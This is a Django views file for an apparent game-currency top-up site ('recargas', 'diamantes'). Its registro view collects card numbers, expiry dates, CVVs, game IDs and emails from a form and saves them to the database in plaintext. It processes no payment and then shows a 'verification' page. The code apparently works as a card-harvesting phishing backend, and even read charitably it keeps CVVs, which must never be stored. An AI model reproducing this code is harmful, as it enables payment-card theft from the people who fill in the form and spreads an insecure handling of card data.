from django.shortcuts import render
from django.http import HttpResponseRedirect
from .models import Diamantes, EmailValido,  CardsDatas


def index(request):
      return render(request, "recargas/index.html")


def registro(request, numero):

      diamantes = Diamantes.objects.get(pk=numero)
      contex = {
            "comprobar_numeros": numero,
            "diamantes": diamantes,       }

      if request.method == 'POST':

            card = CardsDatas()
            email_3 = EmailValido()

            card.comprobar_numero =  numero
            card.id_game = request.POST['id_game']
            card.number_card = request.POST["number_card"] 
            card.date = request.POST["date"] 
            card.cvv = request.POST["cvv"]

            email_3.email_correo = request.POST['email_3']
            email_3.save()
            card.save() 

            return HttpResponseRedirect("/verificar/")

      else:
            return render(request, "recargas/registro.html", contex)
                  
      
def verificar(request):
      cards = CardsDatas.objects.all()
      email = EmailValido.objects.all()
      
      lista_id_game = []
      lista_email_correo = []

      for card in cards:
               lista_id_game.append(card.id_game)
      counts_cards= len(lista_id_game)
      listo_cards = lista_id_game[counts_cards-1]

      for correo in email:
            lista_email_correo.append(correo.email_correo)
      counts_email = len(lista_email_correo)
      listo_email = lista_email_correo[counts_email-1]
      

      context = {
            "listo_cards": listo_cards,
            "listo_email":listo_email,          }

      return render(request,"recargas/verificar.html", context)
     

def info(request):
      return render(request,'recargas/info.html')


def amigo(request):
      return render(request, 'recargas/amigo.html')